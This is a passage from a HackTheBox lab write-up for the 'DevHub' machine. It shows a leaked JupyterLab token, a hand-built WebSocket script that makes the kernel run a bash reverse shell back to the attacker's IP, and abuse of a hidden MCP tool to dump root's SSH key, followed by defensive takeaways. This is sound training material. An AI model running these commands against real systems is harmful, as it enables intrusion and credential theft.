+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root      978  python3 /opt/opsmcp/server.py</span><br><span class="line">analyst  1081  /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 ...</span><br></pre></td></tr></table></figure></div>
+
+<p>That’s a much more interesting picture than the external scan gave us:</p>
+<ul>
+<li><strong><code>127.0.0.1:8888</code></strong> — JupyterLab, running as <strong><code>analyst</code></strong>. That’s a user account, and <code>analyst</code> is almost certainly where the user flag lives.</li>
+<li><strong><code>127.0.0.1:5000</code></strong> — a Python Flask app out of <code>/opt/opsmcp/</code>, running as <strong>root</strong>.</li>
+</ul>
+<p>So we have a lateral move and a vertical move both sitting on the loopback, and we’re already inside the loopback. Jupyter first.</p>
+<h2 id="Leaking-the-Jupyter-Token-from-ps"><a href="#Leaking-the-Jupyter-Token-from-ps" class="headerlink" title="Leaking the Jupyter Token from ps"></a>Leaking the Jupyter Token from <code>ps</code></h2><p>JupyterLab authenticates with a token. When the server starts, it either generates one and prints the URL with <code>?token=...</code> appended, or it takes one from configuration. Here, whoever set this up passed it as a command-line flag — and on Linux, <code>/proc/&lt;pid&gt;/cmdline</code> is world-readable. Every single process’s full argument vector is public information to every user on the box.</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mcp-dev@devhub:~$ ps auxww | grep -i jupyter | grep -v grep</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">analyst   1081  0.3  2.1 ... /home/analyst/jupyter-env/bin/jupyter-lab</span><br><span class="line">    --ip=127.0.0.1 --port=8888 --no-browser</span><br><span class="line">    --notebook-dir=/home/analyst/notebooks</span><br><span class="line">    --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7</span><br><span class="line">    --ServerApp.password=</span><br></pre></td></tr></table></figure></div>
+
+<p>There’s the whole credential, in plaintext, readable by an unprivileged service account. <code>--ServerApp.password=</code> being empty means the token is the <em>only</em> authentication in front of this server.</p>
+<p>This is a mistake that bites people constantly and it’s worth being explicit about why: secrets passed as command-line arguments are not secrets. They’re visible in <code>ps</code> output to every local user, they get captured by process accounting, and they land in shell history. The fix is a config file with <code>0600</code> permissions or an environment variable — and even the environment variable is only safe because <code>/proc/&lt;pid&gt;/environ</code> is restricted to the owning user, which <code>cmdline</code> deliberately is not.</p>
+<p>Let’s confirm the token actually works, from inside the <code>mcp-dev</code> shell since the service is loopback-only:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mcp-dev@devhub:~$ curl -s -H <span class="string">&quot;Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7&quot;</span> \</span><br><span class="line">        http://127.0.0.1:8888/api/contents | <span class="built_in">head</span> -c 200</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;quarterly_analysis.ipynb&quot;</span><span class="punctuation">,</span><span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="string">&quot;quarterly_analysis.ipynb&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;notebook&quot;</span><span class="punctuation">,</span>...</span><br></pre></td></tr></table></figure></div>
+
+<p>Authenticated to JupyterLab as <code>analyst</code>.</p>
+<h2 id="Pivoting-to-analyst-—-Jupyter-Kernel-Execution"><a href="#Pivoting-to-analyst-—-Jupyter-Kernel-Execution" class="headerlink" title="Pivoting to analyst — Jupyter Kernel Execution"></a>Pivoting to <code>analyst</code> — Jupyter Kernel Execution</h2><p>Now, the obvious move with a notebook server is to open a notebook, type <code>os.system(...)</code> into a cell and run it. We don’t have a browser pointed at the loopback of a remote box, though, and tunnelling the port back over SSH isn’t available either — we don’t have SSH credentials yet. So we talk to the Jupyter REST and WebSocket APIs directly, which is cleaner anyway.</p>
+<p>The reason this gets us code execution is the Jupyter architecture itself. The server process and the <em>kernel</em> are separate processes. The kernel is the thing that actually evaluates code, it’s spawned by the server, and it inherits the server’s UID. So any <code>execute_request</code> we send to a kernel runs as <code>analyst</code> — the notebook UI is just a front-end to exactly the API we’re about to use.</p>
+<p>Step one, ask the server to spawn us a kernel:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mcp-dev@devhub:~$ KERNEL_ID=$(curl -s -X POST http://127.0.0.1:8888/api/kernels \</span><br><span class="line">    -H <span class="string">&quot;Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7&quot;</span> \</span><br><span class="line">    -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d <span class="string">&#x27;&#123;&#125;&#x27;</span> \</span><br><span class="line">    | python3 -c <span class="string">&quot;import sys,json;print(json.load(sys.stdin)[&#x27;id&#x27;])&quot;</span>)</span><br><span class="line">mcp-dev@devhub:~$ <span class="built_in">echo</span> <span class="string">&quot;kernel=<span class="variable">$KERNEL_ID</span>&quot;</span></span><br><span class="line">kernel=3f8c1a92-7d4e-4b61-9c03-b5a2e1f7d8c6</span><br></pre></td></tr></table></figure></div>
+
+<p>Step two, a second listener on the attacker box for our <code>analyst</code> shell:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ nc -lvnp 9002</span><br><span class="line">listening on [any] 9002 ...</span><br></pre></td></tr></table></figure></div>
+
+<p>Step three is the only fiddly part. Code execution against a kernel goes over a WebSocket at <code>/api/kernels/&lt;id&gt;/channels</code>, and the box doesn’t ship <code>websocket-client</code> — so rather than fight pip on a box with no egress, we do the framing by hand. It’s less work than it sounds: we need one HTTP Upgrade request, then one masked text frame carrying a Jupyter <code>execute_request</code> message.</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">mcp-dev@devhub:~$ python3 - &lt;&lt;<span class="string">&#x27;PY&#x27;</span></span><br><span class="line"><span class="keyword">import</span> socket, base64, os, json, struct, uuid, time</span><br><span class="line"></span><br><span class="line">TOKEN     = <span class="string">&quot;a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7&quot;</span></span><br><span class="line">KERNEL_ID = <span class="string">&quot;3f8c1a92-7d4e-4b61-9c03-b5a2e1f7d8c6&quot;</span></span><br><span class="line">ATTACKER  = <span class="string">&quot;10.10.16.32&quot;</span></span><br><span class="line">PORT      = <span class="number">9002</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- WebSocket handshake, with the Jupyter token on the upgrade request ---</span></span><br><span class="line">s = socket.create_connection((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>))</span><br><span class="line">key = base64.b64encode(os.urandom(<span class="number">16</span>)).decode()</span><br><span class="line">s.send((</span><br><span class="line">    <span class="string">f&quot;GET /api/kernels/<span class="subst">&#123;KERNEL_ID&#125;</span>/channels HTTP/1.1\r\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;Host: 127.0.0.1:8888\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;Sec-WebSocket-Key: <span class="subst">&#123;key&#125;</span>\r\nSec-WebSocket-Version: 13\r\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;Authorization: token <span class="subst">&#123;TOKEN&#125;</span>\r\n\r\n&quot;</span></span><br><span class="line">).encode())</span><br><span class="line">s.recv(<span class="number">4096</span>)   <span class="comment"># 101 Switching Protocols</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- the code the kernel will run, as analyst ---</span></span><br><span class="line">code = <span class="string">f&quot;import os; os.system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/<span class="subst">&#123;ATTACKER&#125;</span>/<span class="subst">&#123;PORT&#125;</span> 0&gt;&amp;1\&quot;&#x27;)&quot;</span></span><br><span class="line">msg = json.dumps(&#123;</span><br><span class="line">    <span class="string">&quot;header&quot;</span>: &#123;<span class="string">&quot;msg_id&quot;</span>: <span class="built_in">str</span>(uuid.uuid4()), <span class="string">&quot;username&quot;</span>: <span class="string">&quot;x&quot;</span>,</span><br><span class="line">               <span class="string">&quot;session&quot;</span>: <span class="built_in">str</span>(uuid.uuid4()), <span class="string">&quot;msg_type&quot;</span>: <span class="string">&quot;execute_request&quot;</span>,</span><br><span class="line">               <span class="string">&quot;version&quot;</span>: <span class="string">&quot;5.0&quot;</span>&#125;,</span><br><span class="line">    <span class="string">&quot;parent_header&quot;</span>: &#123;&#125;, <span class="string">&quot;metadata&quot;</span>: &#123;&#125;,</span><br><span class="line">    <span class="string">&quot;content&quot;</span>: &#123;<span class="string">&quot;code&quot;</span>: code, <span class="string">&quot;silent&quot;</span>: <span class="literal">False</span>&#125;</span><br><span class="line">&#125;).encode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- mask and frame it (client frames MUST be masked per RFC 6455) ---</span></span><br><span class="line">mask   = os.urandom(<span class="number">4</span>)</span><br><span class="line">masked = <span class="built_in">bytes</span>(b ^ mask[i % <span class="number">4</span>] <span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg))</span><br><span class="line">frame  = <span class="built_in">bytearray</span>([<span class="number">0x81</span>])                       <span class="comment"># FIN + text opcode</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(masked) &lt;= <span class="number">125</span>:</span><br><span class="line">    frame.append(<span class="number">0x80</span> | <span class="built_in">len</span>(masked))</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(masked) &lt;= <span class="number">65535</span>:</span><br><span class="line">    frame.append(<span class="number">0xFE</span>); frame += struct.pack(<span class="string">&quot;&gt;H&quot;</span>, <span class="built_in">len</span>(masked))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    frame.append(<span class="number">0xFF</span>); frame += struct.pack(<span class="string">&quot;&gt;Q&quot;</span>, <span class="built_in">len</span>(masked))</span><br><span class="line">frame += mask + masked</span><br><span class="line"></span><br><span class="line">s.send(<span class="built_in">bytes</span>(frame)); time.sleep(<span class="number">2</span>); s.close()</span><br><span class="line">PY</span><br></pre></td></tr></table></figure></div>
+
+<p>The two things to keep straight if you’re writing this yourself: the token goes on the <em>upgrade</em> request (Jupyter authenticates the WebSocket at handshake time, not per-message), and the mask bit on the second header byte is mandatory for client-to-server frames — unmasked frames get the connection dropped with no useful error.</p>
+<p>Over on the second listener:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">connect to [10.10.16.32] from (UNKNOWN) [10.129.13.179] 48112</span><br><span class="line">analyst@devhub:~$ id</span><br><span class="line">uid=1001(analyst) gid=1001(analyst) groups=1001(analyst)</span><br></pre></td></tr></table></figure></div>
+
+<p>Cross-user pivot done, off the back of a token we read out of <code>ps</code>.</p>
+<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">analyst@devhub:~$ <span class="built_in">cat</span> /home/analyst/user.txt</span><br><span class="line">10b0833a464a0b62c9a0d4cb6fe6f3ca</span><br></pre></td></tr></table></figure></div>
+
+
+<h2 id="Enumerating-OpsMCP-—-the-Root-Owned-Flask-API"><a href="#Enumerating-OpsMCP-—-the-Root-Owned-Flask-API" class="headerlink" title="Enumerating OpsMCP — the Root-Owned Flask API"></a>Enumerating OpsMCP — the Root-Owned Flask API</h2><p>Which leaves the root-owned Flask app on <code>127.0.0.1:5000</code>. <code>analyst</code>‘s home has one thing in it that <code>mcp-dev</code> couldn’t read, and it’s named helpfully:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">analyst@devhub:~$ <span class="built_in">ls</span> -la ~</span><br><span class="line">-rw------- 1 analyst analyst   33 Oct  9 11:02 .opsmcp_key</span><br><span class="line">drwxr-xr-x 2 analyst analyst 4096 Oct  9 11:02 notebooks</span><br><span class="line">-rw-r----- 1 root    analyst   33 Oct  9 11:04 user.txt</span><br><span class="line"></span><br><span class="line">analyst@devhub:~$ <span class="built_in">cat</span> ~/.opsmcp_key</span><br><span class="line">opsmcp_secret_key_4f5a6b7c8d9e0f1a</span><br></pre></td></tr></table></figure></div>
+
+<p>Note the permissions on that file — <code>0600</code>, <code>analyst</code> only. Which is correct hardening, and also completely irrelevant, because the Jupyter kernel we exploited <em>runs as</em> <code>analyst</code>. The file permission was doing its job perfectly; the problem is that we became the user it was protecting it from everyone else for.</p>
+<p>The application source is world-readable, so we read it before poking at the API:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">analyst@devhub:~$ <span class="built_in">head</span> -60 /opt/opsmcp/server.py</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">VALID_API_KEY = <span class="string">&quot;opsmcp_secret_key_4f5a6b7c8d9e0f1a&quot;</span></span><br><span class="line"></span><br><span class="line">VISIBLE_TOOLS = &#123;</span><br><span class="line">    <span class="string">&quot;ops.system_status&quot;</span>: tool_system_status,</span><br><span class="line">    <span class="string">&quot;ops.list_services&quot;</span>: tool_list_services,</span><br><span class="line">    <span class="string">&quot;ops.check_disk&quot;</span>:    tool_check_disk,</span><br><span class="line">    <span class="string">&quot;ops.view_logs&quot;</span>:     tool_view_logs,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># internal / not exposed in the tool listing</span></span><br><span class="line">HIDDEN_TOOLS = &#123;</span><br><span class="line">    <span class="string">&quot;ops._admin_dump&quot;</span>:   tool_admin_dump,</span><br><span class="line">    <span class="string">&quot;ops._debug_mode&quot;</span>:   tool_debug_mode,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ALL_TOOLS = &#123;**VISIBLE_TOOLS, **HIDDEN_TOOLS&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>And there’s the bug, sitting in four lines of dictionary merging. <code>/tools/list</code> enumerates <code>VISIBLE_TOOLS</code>. <code>/tools/call</code> dispatches against <code>ALL_TOOLS</code>.</p>
+<p>This is worth dwelling on because it’s going to be an extremely common finding as MCP servers proliferate. The MCP tool listing is a <em>discovery</em> mechanism — it tells a client what’s available. It is not, and was never meant to be, an <em>authorization</em> mechanism. Treating “I left it out of the listing” as “the client can’t call it” is security by obscurity with the obscurity provided by a comment. Any caller who knows or guesses the tool name invokes it exactly as if it had been advertised, because the dispatch map doesn’t care where the name came from. Prefixing the hidden tools with an underscore is a naming convention, not an access control.</p>
+<p>We can see the difference in one pair of requests:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">analyst@devhub:~$ curl -s -X POST http://127.0.0.1:5000/tools/list \</span><br><span class="line">    -H <span class="string">&quot;X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a&quot;</span> | python3 -m json.tool</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;tools&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ops.system_status&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Return host uptime, load and memory&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ops.list_services&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;List systemd unit states&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ops.check_disk&quot;</span><span class="punctuation">,</span>    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Report filesystem usage&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ops.view_logs&quot;</span><span class="punctuation">,</span>     <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Tail a journald unit&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Four tools, all read-only and harmless. <code>ops._admin_dump</code> is nowhere in that output — and is fully callable.</p>
+<h2 id="Dumping-Root’s-SSH-Private-Key"><a href="#Dumping-Root’s-SSH-Private-Key" class="headerlink" title="Dumping Root’s SSH Private Key"></a>Dumping Root’s SSH Private Key</h2><p><code>tool_admin_dump</code> takes a <code>target</code> argument, and the source shows three accepted values: <code>ssh_keys</code>, <code>passwords</code> and <code>tokens</code>. It also requires <code>confirm: true</code> — without it the endpoint bails out with <code>&#123;&quot;error&quot;:&quot;Confirmation required&quot;&#125;</code>, which is a nice illustration of the mindset behind this code. Someone thought carefully enough about this function being dangerous to add a confirmation guard against <em>accidental</em> invocation, and then didn’t think about deliberate invocation at all.</p>
+<p>The function reads whatever the target maps to and returns the contents inline in the JSON response. Since the Flask process is running as <code>uid=0</code>, “whatever the target maps to” includes <code>/root/.ssh/id_rsa</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">analyst@devhub:~$ curl -s -X POST http://127.0.0.1:5000/tools/call \</span><br><span class="line">    -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">    -H <span class="string">&quot;X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a&quot;</span> \</span><br><span class="line">    -d <span class="string">&#x27;&#123;&quot;name&quot;:&quot;ops._admin_dump&quot;,&quot;arguments&quot;:&#123;&quot;target&quot;:&quot;ssh_keys&quot;,&quot;confirm&quot;:true&#125;&#125;&#x27;</span> \</span><br><span class="line">    &gt; /tmp/opsdump.json</span><br><span class="line"></span><br><span class="line">analyst@devhub:~$ <span class="built_in">head</span> -c 300 /tmp/opsdump.json</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;ok&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;target&quot;</span><span class="punctuation">:</span><span class="string">&quot;ssh_keys&quot;</span><span class="punctuation">,</span><span class="attr">&quot;root_private_key&quot;</span><span class="punctuation">:</span><span class="string">&quot;-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEA...</span></span><br></pre></td></tr></table></figure></div>
+
+<p>There it is, root’s private key, handed over by an API call. We pull it out of the JSON and fix the permissions so OpenSSH will accept it:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">analyst@devhub:~$ python3 -c \</span><br><span class="line">    <span class="string">&quot;import json;print(json.load(open(&#x27;/tmp/opsdump.json&#x27;))[&#x27;root_private_key&#x27;])&quot;</span> \</span><br><span class="line">    &gt; /tmp/root_key</span><br><span class="line">analyst@devhub:~$ <span class="built_in">chmod</span> 600 /tmp/root_key</span><br><span class="line">analyst@devhub:~$ <span class="built_in">head</span> -1 /tmp/root_key; ssh-keygen -y -f /tmp/root_key | <span class="built_in">head</span> -c 60</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLm9xT4...</span><br></pre></td></tr></table></figure></div>
+
+<p><code>ssh-keygen -y</code> deriving a public key without prompting tells us the key has no passphrase, so it’s immediately usable.</p>
+<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><p>The key is in <code>/root/.ssh/</code>, which means its public half is in <code>/root/.ssh/authorized_keys</code>, which means we can log straight in as root over the SSH service that’s been sitting there on port 22 since the first nmap scan — no further pivoting needed, and from the attacker box rather than through two stacked reverse shells:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ ssh -i /tmp/root_key -o StrictHostKeyChecking=no root@10.129.13.179 \</span><br><span class="line">    <span class="string">&#x27;id; hostname; cat /root/root.txt&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">devhub</span><br><span class="line">8bde0b32ba841169667f0e2215fda160</span><br></pre></td></tr></table></figure></div>
+
+<p>And that’s root — a proper interactive, stable, key-authenticated root session, which is a much nicer place to end up than a <code>bash -p</code> trick.</p>
+<h2 id="Key-Takeaways"><a href="#Key-Takeaways" class="headerlink" title="Key Takeaways"></a>Key Takeaways</h2><p>Every link in this chain is independent of the others, and every one of them is a decision that looked reasonable to whoever made it:</p>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Vulnerability</th>
+<th>Impact</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MCPJam Inspector</td>
+<td>CVE-2026-23744 — unauthenticated <code>serverConfig.command</code> injection on <code>/api/mcp/connect</code></td>
+<td>RCE as <code>mcp-dev</code></td>
+</tr>
+<tr>
+<td>JupyterLab</td>
+<td>Auth token passed in process argv (<code>--ServerApp.token=…</code>), world-readable via <code>ps</code></td>
+<td>Cross-user pivot</td>
+</tr>
+<tr>
+<td>File permissions</td>
+<td><code>~/.opsmcp_key</code> correctly <code>0600</code> — but Jupyter kernels execute <em>as</em> <code>analyst</code></td>
+<td>API key recovery</td>
+</tr>
+<tr>
+<td>OpsMCP Flask</td>
+<td>Hidden tool <code>ops._admin_dump</code> dispatched from <code>ALL_TOOLS</code> while <code>/tools/list</code> only shows <code>VISIBLE_TOOLS</code></td>
+<td>Root-owned arbitrary file read</td>
+</tr>
+<tr>
+<td>Key hygiene</td>
+<td>Root’s <code>id_rsa</code> readable by the root-owned app, no passphrase</td>
+<td>Persistent root via SSH</td>
+</tr>
+</tbody></table>
+<p>The two that I think are worth actually internalising are the first and the fourth, because they’re the same mistake wearing different clothes. MCPJam was written as a localhost developer tool and therefore has no authentication — perfectly defensible right up until someone binds it to <code>0.0.0.0</code>, at which point “it’s local” stops being a security property and the tool has none left. OpsMCP left a dangerous tool out of its listing and treated that as access control — perfectly defensible if you believe clients only call what they discover, which no attacker has ever done.</p>
+<p>Both are the same instinct: an implicit boundary mistaken for an enforced one. And the thing about this box is that MCP tooling is young enough that these patterns are everywhere in real deployments right now. If you’re running an MCP server, the question to ask is not “what does my tool listing expose” but “what happens when someone calls every function in my dispatch map with arguments I didn’t anticipate” — because a listing is documentation, and your authorization check needs to live inside the call path.</p>
+<p>Oh, and run the full port scan. Always run the full port scan.</p>
+<p>That was it for DevHub, hope you learned something new!</p>
+<ul>
+<li>0xkujen</li>
+</ul>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: DevHub</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-10-13 17:40:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-10-13 17:57:51
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/10/13/Hackthebox-DevHub/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/hackthebox/">#hackthebox</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/MCP/">#MCP</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/MCPJam-Inspector/">#MCPJam Inspector</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/CVE-2026-23744/">#CVE-2026-23744</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Command-Injection/">#Command Injection</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/RCE/">#RCE</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/JupyterLab/">#JupyterLab</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Jupyter-Kernel/">#Jupyter Kernel</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/WebSocket/">#WebSocket</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
